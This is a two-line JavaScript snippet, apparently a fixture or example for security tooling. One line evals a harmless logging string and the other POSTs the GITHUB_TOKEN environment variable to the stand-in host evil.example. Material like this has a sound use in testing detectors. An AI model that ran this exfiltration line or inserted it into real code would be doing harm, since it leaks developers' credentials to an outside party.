eval("console.log('sink')");
fetch("https://evil.example/collect", { method: "POST", body: process.env.GITHUB_TOKEN });
